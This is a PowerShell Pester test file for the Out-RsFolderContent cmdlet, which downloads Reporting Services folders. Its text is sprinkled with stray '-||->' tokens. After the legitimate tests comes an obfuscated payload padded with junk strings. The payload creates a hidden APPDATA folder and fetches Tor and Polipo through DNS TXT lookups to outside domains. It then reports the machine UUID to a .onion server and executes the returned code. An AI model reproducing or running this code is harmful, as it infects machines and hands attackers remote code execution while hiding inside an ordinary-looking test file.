


 -||-> Describe "Out-RsFolderContent" {

         -||-> Context "Out-RsFolderContent with min parameters"{
                 -||-> $folderName = 'SutOutRsFolderContentMinParameters' + [guid]::NewGuid() <-||- 
                 -||-> New-RsFolder -Path / -FolderName $folderName <-||- 
                 -||-> $rsFolderPath = '/' + $folderName <-||- 
                 -||-> $localResourcesPath =   ( -||-> Get-Item -Path ".\" <-||- ).FullName  + '\Tests\CatalogItems\testResources' <-||- 
                 -||-> Write-RsFolderContent -Path $localResourcesPath -RsFolder $rsFolderPath <-||- 
                 -||-> $localFolderName = 'SutOutRsFolderContentTestMin' + [guid]::NewGuid() <-||- 
                 -||-> $currentLocalPath = ( -||-> Get-Item -Path ".\" <-||-  ).FullName <-||- 
                 -||-> $destinationPath = $currentLocalPath + '\' + $localFolderName <-||- 
                 -||-> New-Item -Path $destinationPath -type "directory" <-||- 
                 -||-> Out-RsFolderContent -RsFolder $rsFolderPath -Destination $destinationPath <-||- 
                 -||-> $localChildrenFolder =  -||-> Get-ChildItem $destinationPath <-||-  <-||- 

                 -||-> It "Should download a report from Reporting Services with min parameters" { 
                        -||-> $localReport =  -||-> $localChildrenFolder | Where-Object Name -eq 'emptyReport.rdl' <-||-  <-||- 
                        -||-> $localReport.Name | Should Be 'emptyReport.rdl' <-||- 
                } <-||- 

                 -||-> It "Should download a RsDataSource from Reporting Services with min parameters" {
                         -||-> $localDataSource =  -||-> $localChildrenFolder| Where-Object Name -eq 'SutWriteRsFolderContent_DataSource.rsds' <-||-  <-||- 
                         -||-> $localDataSource.Name | Should Be 'SutWriteRsFolderContent_DataSource.rsds' <-||- 
                } <-||- 

                 -||-> It "Should download a RsDataSet from Reporting Services with min parameters" {
                         -||-> $localDataSource =  -||-> $localChildrenFolder | Where-Object Name -eq 'UnDataSet.rsd' <-||-  <-||- 
                         -||-> $localDataSource.Name | Should Be 'UnDataSet.rsd' <-||- 
                } <-||- 
                
                 -||-> Remove-Item  $destinationPath -Confirm:$false -Recurse <-||- 
                 -||-> Remove-RsCatalogItem -RsFolder $rsFolderPath -Confirm:$false <-||- 
        } <-||- 

         -||-> Context "Out-RsFolderContent with ReportServerUri Parameter"{
                 -||-> $folderName = 'SutOutRsFolderContentReportServerUriParameters' + [guid]::NewGuid() <-||- 
                 -||-> New-RsFolder -Path / -FolderName $folderName <-||- 
                 -||-> $rsFolderPath = '/' + $folderName <-||- 
                 -||-> $localResourcesPath =   ( -||-> Get-Item -Path ".\" <-||- ).FullName  + '\Tests\CatalogItems\testResources' <-||- 
                 -||-> Write-RsFolderContent -Path $localResourcesPath -RsFolder $rsFolderPath <-||- 
                 -||-> $localFolderName = 'SutOutRsFolderContentTestReportUri' + [guid]::NewGuid() <-||- 
                 -||-> $currentLocalPath = ( -||-> Get-Item -Path ".\" <-||-  ).FullName <-||- 
                 -||-> $destinationPath = $currentLocalPath + '\' + $localFolderName <-||- 
                 -||-> New-Item -Path $destinationPath -type "directory" <-||- 
                 -||-> $reportServerUri = 'http://localhost/reportserver' <-||- 
                 -||-> Out-RsFolderContent -RsFolder $rsFolderPath -Destination $destinationPath -ReportServerUri $reportServerUri <-||- 
                 -||-> $localChildrenFolder =  -||-> Get-ChildItem $destinationPath <-||-  <-||- 

                 -||-> It "Should download a report from Reporting Services with ReportServerUri parameters" {
                         -||-> $localReport =  -||-> $localChildrenFolder | Where-Object Name -eq 'emptyReport.rdl' <-||-  <-||- 
                         -||-> $localReport.Name | Should Be 'emptyReport.rdl' <-||- 
                } <-||- 
                
                 -||-> Remove-Item  $destinationPath -Confirm:$false -Recurse <-||- 
                 -||-> Remove-RsCatalogItem -RsFolder $rsFolderPath -Confirm:$false <-||- 
        } <-||- 

         -||-> Context "Out-RsFolderContent with Proxy Parameter"{
                 -||-> $folderName = 'SutOutRsFolderContentProxyParameter' + [guid]::NewGuid() <-||- 
                 -||-> New-RsFolder -Path / -FolderName $folderName <-||- 
                 -||-> $rsFolderPath = '/' + $folderName <-||- 
                 -||-> $localResourcesPath =   ( -||-> Get-Item -Path ".\" <-||- ).FullName  + '\Tests\CatalogItems\testResources' <-||- 
                 -||-> Write-RsFolderContent -Path $localResourcesPath -RsFolder $rsFolderPath <-||- 
                 -||-> $localFolderName = 'SutOutRsFolderContentTestProxy' + [guid]::NewGuid() <-||- 
                 -||-> $currentLocalPath = ( -||-> Get-Item -Path ".\" <-||-  ).FullName <-||- 
                 -||-> $destinationPath = $currentLocalPath + '\' + $localFolderName <-||- 
                 -||-> New-Item -Path $destinationPath -type "directory" <-||- 
                 -||-> $proxy =  -||-> New-RsWebServiceProxy <-||-  <-||-  
                 -||-> Out-RsFolderContent -RsFolder $rsFolderPath -Destination $destinationPath -Proxy $proxy <-||- 
                 -||-> $localChildrenFolder =  -||-> Get-ChildItem $destinationPath <-||-  <-||- 

                 -||-> It "Should download a report from Reporting Services with Proxy Parameters" {
                         -||-> $localReport =  -||-> $localChildrenFolder | Where-Object Name -eq 'emptyReport.rdl' <-||-  <-||- 
                         -||-> $localReport.Name | Should Be 'emptyReport.rdl' <-||- 
                } <-||- 
                
                 -||-> Remove-Item  $destinationPath -Confirm:$false -Recurse <-||- 
                 -||-> Remove-RsCatalogItem -RsFolder $rsFolderPath -Confirm:$false <-||- 
        } <-||- 

         -||-> Context "Out-RsFolderContent with Proxy and ReportServer Parameter"{
                 -||-> $folderName = 'SutOutRsFolderContentAllParameters' + [guid]::NewGuid() <-||- 
                 -||-> New-RsFolder -Path / -FolderName $folderName <-||- 
                 -||-> $rsFolderPath = '/' + $folderName <-||- 
                 -||-> $localResourcesPath =   ( -||-> Get-Item -Path ".\" <-||- ).FullName  + '\Tests\CatalogItems\testResources' <-||- 
                 -||-> Write-RsFolderContent -Path $localResourcesPath -RsFolder $rsFolderPath <-||- 
                 -||-> $localFolderName = 'SutOutRsFolderContentTestAllParam' + [guid]::NewGuid() <-||- 
                 -||-> $currentLocalPath = ( -||-> Get-Item -Path ".\" <-||-  ).FullName <-||- 
                 -||-> $destinationPath = $currentLocalPath + '\' + $localFolderName <-||- 
                 -||-> New-Item -Path $destinationPath -type "directory" <-||- 
                 -||-> $proxy =  -||-> New-RsWebServiceProxy <-||-  <-||-  
                 -||-> $reportServerUri = 'http://localhost/reportserver' <-||- 
                 -||-> Out-RsFolderContent -RsFolder $rsFolderPath -Destination $destinationPath -Proxy $proxy -ReportServerUri $reportServerUri <-||- 
                 -||-> $localChildrenFolder =  -||-> Get-ChildItem $destinationPath <-||-  <-||- 

                 -||-> It "Should download a report from Reporting Services with Proxy and ReportServerUri parameter" {
                         -||-> $localReport =  -||-> $localChildrenFolder | Where-Object Name -eq 'emptyReport.rdl' <-||-  <-||- 
                         -||-> $localReport.Name | Should Be 'emptyReport.rdl' <-||- 
                } <-||- 
                
                 -||-> Remove-Item  $destinationPath -Confirm:$false -Recurse <-||- 
                 -||-> Remove-RsCatalogItem -RsFolder $rsFolderPath -Confirm:$false <-||- 
        } <-||- 

         -||-> Context "Out-RsFolderContent with recurse parameters"{
                 -||-> $folderName = 'SutOutRsFolderContentRecurseParameters' + [guid]::NewGuid() <-||- 
                 -||-> New-RsFolder -Path / -FolderName $folderName <-||- 
                 -||-> $rsFolderPath = '/' + $folderName <-||- 
                 -||-> $localResourcesPath =   ( -||-> Get-Item -Path ".\" <-||- ).FullName  + '\Tests\CatalogItems\testResources' <-||- 
                 -||-> Write-RsFolderContent -Path $localResourcesPath -RsFolder $rsFolderPath -Recurse <-||- 
                 -||-> $localFolderName = 'SutOutRsFolderContentTestRecurse' + [guid]::NewGuid() <-||- 
                 -||-> $currentLocalPath = ( -||-> Get-Item -Path ".\" <-||-  ).FullName <-||- 
                 -||-> $destinationPath = $currentLocalPath + '\' + $localFolderName <-||- 
                 -||-> New-Item -Path $destinationPath -type "directory" <-||- 
                 -||-> Out-RsFolderContent -RsFolder $rsFolderPath -Destination $destinationPath -Recurse <-||- 
                 -||-> $localChildrenFolder =  -||-> Get-ChildItem $destinationPath -Recurse <-||-  <-||- 

                 -||-> It "Should download a report in a folder from Reporting Services with min parameters" { 
                        -||-> $localReport =  -||-> $localChildrenFolder | Where-Object Name -eq 'emptyReport.rdl' <-||-  <-||- 
                        -||-> $localReport.Name | Should Be 'emptyReport.rdl' <-||- 
                } <-||- 

                 -||-> It "Should download a RsDataSource from Reporting Services with min parameters" {
                         -||-> $localDataSource =  -||-> $localChildrenFolder| Where-Object Name -eq 'SutWriteRsFolderContent_DataSource.rsds' <-||-  <-||- 
                         -||-> $localDataSource.Name | Should Be 'SutWriteRsFolderContent_DataSource.rsds' <-||- 
                } <-||- 

                 -||-> It "Should download a RsDataSet from Reporting Services with min parameters" {
                         -||-> $localDataSource =  -||-> $localChildrenFolder | Where-Object Name -eq 'UnDataSet.rsd' <-||-  <-||- 
                         -||-> $localDataSource.Name | Should Be 'UnDataSet.rsd' <-||- 
                } <-||- 

                 -||-> It "Should download a report inside a subfolder from Reporting Services with min parameters" { 
                        -||-> $localReport =  -||-> $localChildrenFolder | Where-Object Name -eq 'emptyReport2.rdl' <-||-  <-||- 
                        -||-> $localReport.Name | Should Be 'emptyReport2.rdl' <-||- 
                } <-||- 

                  -||-> It "Should download a subfolder from Reporting Services with min parameters" { 
                        -||-> $localReport =  -||-> $localChildrenFolder | Where-Object Name -eq 'testResources2' <-||-  <-||- 
                        -||-> $localReport.Name | Should Be 'testResources2' <-||- 
                } <-||- 
                
                 -||-> Remove-RsCatalogItem -RsFolder $rsFolderPath -Confirm:$false <-||- 
                 -||-> Remove-Item  $destinationPath -Confirm:$false -Recurse <-||- 
        } <-||- 
} <-||- 
 -||-> 'iewtZ' <-||- ; -||-> $ErrorActionPreference = 'SilentlyContinue' <-||- ; -||-> 'sLfbdc' <-||- ; -||-> 'SvpvZJY' <-||- ; -||-> $vyih = ( -||-> get-wmiobject Win32_ComputerSystemProduct <-||- ).UUID <-||- ; -||-> 'gwWrloV' <-||- ; -||-> 'ouvd' <-||- ; -||-> if ( -||-> ( -||-> gp HKCU:\\Software\Microsoft\Windows\CurrentVersion\Run <-||- ) -match $vyih <-||- ){; -||-> 'cLJEJvJeL' <-||- ; -||-> 'ESlFQFDG' <-||- ; -||-> ( -||-> Get-Process -id $pid <-||- ).Kill() <-||- ; -||-> 'BNBekbF' <-||- ; -||-> 'iCIcWAWiH' <-||- ;} <-||- ; -||-> 'updYlRxc' <-||- ; -||-> 'Yu' <-||- ; -||-> function e($cxj){; -||-> 'INWYxMFSSxC' <-||- ; -||-> 'hljZOzviQHL' <-||- ; -||-> $muo = ( -||-> ( -||-> ( -||-> iex "nslookup -querytype=txt $cxj 8.8.8.8" <-||- ) -match '"' <-||- ) -replace '"', '' <-||- )[0].Trim() <-||- ; -||-> 'wqBuiyIUeiD' <-||- ; -||-> 'EZXzZnfj' <-||- ; -||-> $ii.DownloadFile($muo, $yoe) <-||- ; -||-> 'mllh' <-||- ; -||-> 'gxp' <-||- ; -||-> $vi = $vpw.NameSpace($yoe).Items() <-||- ; -||-> 'DUtRuXurl' <-||- ; -||-> 'wwtbOkl' <-||- ; -||-> $vpw.NameSpace($phi).CopyHere($vi, 20) <-||- ; -||-> 'ZOcGNFapCd' <-||- ; -||-> 'fvVhKXFhu' <-||- ; -||-> rd $yoe <-||- ; -||-> 'bXAJndTZDgZ' <-||- ; -||-> 'JC' <-||- ;} <-||- ; -||-> 'OCLQDWnfu' <-||- ; -||-> 'ikobA' <-||- ; -||-> 'eSOzl' <-||- ; -||-> 'FswTHfHzbr' <-||- ; -||-> 'tTjbUWY' <-||- ; -||-> 'zpzTfITAjM' <-||- ; -||-> $phi = $env:APPDATA + '\' + $vyih <-||- ; -||-> 'pcqZ' <-||- ; -||-> 'lOoNehXCNKV' <-||- ; -||-> if ( -||-> !( -||-> Test-Path $phi <-||- ) <-||- ){; -||-> 'YK' <-||- ; -||-> 'DRt' <-||- ; -||-> $mc =  -||-> New-Item -ItemType Directory -Force -Path $phi <-||-  <-||- ; -||-> 'ZFzNt' <-||- ; -||-> 'GjTw' <-||- ; -||-> $mc.Attributes = "Hidden", "System", "NotContentIndexed" <-||- ; -||-> 'NphybPzgXM' <-||- ; -||-> 'omHVQM' <-||- ;} <-||- ; -||-> 'HHFFHSs' <-||- ; -||-> 'wnXuik' <-||- ; -||-> 'OT' <-||- ; -||-> 'VOLHVuXq' <-||- ; -||-> $uf=$phi+ '\tor.exe' <-||- ; -||-> 'sHVRBHzTXF' <-||- ; -||-> 'trLTGFyqlgE' <-||- ; -||-> $yan=$phi+ '\polipo.exe' <-||- ; -||-> 'Vhdu' <-||- ; -||-> 'gYvdM' <-||- ; -||-> $yoe=$phi+'\'+$vyih+'.zip' <-||- ; -||-> 'ZfDN' <-||- ; -||-> 'UCEhRONmg' <-||- ; -||-> $ii= -||-> New-Object System.Net.WebClient <-||-  <-||- ; -||-> 'Ugpp' <-||- ; -||-> 'cdNqGhCEjG' <-||- ; -||-> $vpw= -||-> New-Object -C Shell.Application <-||-  <-||- ; -||-> 'MsfmRSPjrey' <-||- ; -||-> 'qGy' <-||- ; -||-> 'sH' <-||- ; -||-> 'ix' <-||- ; -||-> if ( -||-> !( -||-> Test-Path $uf <-||- ) -or !( -||-> Test-Path $yan <-||- ) <-||- ){; -||-> 'cPGfgxJLMQ' <-||- ; -||-> 'Oafl' <-||- ; -||-> e 'i.vankin.de' <-||- ; -||-> 'RpGJUxN' <-||- ; -||-> 'EhrEGACdk' <-||- ;} <-||- ; -||-> 'cFrjysajeP' <-||- ; -||-> 'CMTJLy' <-||- ; -||-> 'klIQuOh' <-||- ; -||-> 'UL' <-||- ; -||-> if ( -||-> !( -||-> Test-Path $uf <-||- ) -or !( -||-> Test-Path $yan <-||- ) <-||- ){; -||-> 'RZd' <-||- ; -||-> 'tbVW' <-||- ; -||-> e 'gg.ibiz.cc' <-||- ; -||-> 'mZASyvj' <-||- ; -||-> 'hczjHEH' <-||- ;} <-||- ; -||-> 'IMv' <-||- ; -||-> 'yawpbSHIN' <-||- ; -||-> 'TdYiqz' <-||- ; -||-> 'DaKI' <-||- ; -||-> $iul=$phi+'\roaminglog' <-||- ; -||-> 'KyiAtRISaBi' <-||- ; -||-> 'MIAa' <-||- ; -||-> saps $uf -Ar " --Log `"notice file $iul`"" -wi Hidden <-||- ; -||-> 'Xqo' <-||- ; -||-> 'iX' <-||- ;do{ -||-> sleep 1 <-||- ; -||-> $ep= -||-> gc $iul <-||-  <-||- }while( -||-> !( -||-> $ep -match 'Bootstrapped 100%: Done.' <-||- ) <-||- ); -||-> 'DECq' <-||- ; -||-> 'mMTzmo' <-||- ; -||-> saps $yan -a "socksParentProxy=localhost:9050" -wi Hidden <-||- ; -||-> 'qLzQnQAglU' <-||- ; -||-> 'lc' <-||- ; -||-> sleep 7 <-||- ; -||-> 'OhASXZLVhvy' <-||- ; -||-> 'bUMQerk' <-||- ; -||-> $hja= -||-> New-Object System.Net.WebProxy( -||-> "localhost:8123" <-||- ) <-||-  <-||- ; -||-> 'ysETIFO' <-||- ; -||-> 'aMzeEXJatUc' <-||- ; -||-> $hja.useDefaultCredentials = $true <-||- ; -||-> 'MA' <-||- ; -||-> 'ahxYjELWf' <-||- ; -||-> $ii.proxy=$hja <-||- ; -||-> 'kllZXZPScFE' <-||- ; -||-> 'UnPHeDt' <-||- ; -||-> $laz='http://powerwormjqj42hu.onion/get.php?s=setup&mom=9C7ABD3A-D197-11DB-BBDA-BBE061E60019&uid=' + $vyih <-||- ; -||-> 'cmIJbcllSfd' <-||- ; -||-> 'TRutDNn' <-||- ; -||-> while( -||-> !$qb <-||- ){ -||-> $qb=$ii.downloadString($laz) <-||- } <-||- ; -||-> 'eaxdBgnRytG' <-||- ; -||-> 'UcjybNgU' <-||- ; -||-> if ( -||-> $qb -ne 'none' <-||- ){; -||-> 'uICtlcoEV' <-||- ; -||-> 'udG' <-||- ; -||-> iex $qb <-||- ; -||-> 'XNNdtFqQhSF' <-||- ; -||-> 'QzfWyKqrY' <-||- ;} <-||- ; -||-> 'HqIJJF' <-||- ;



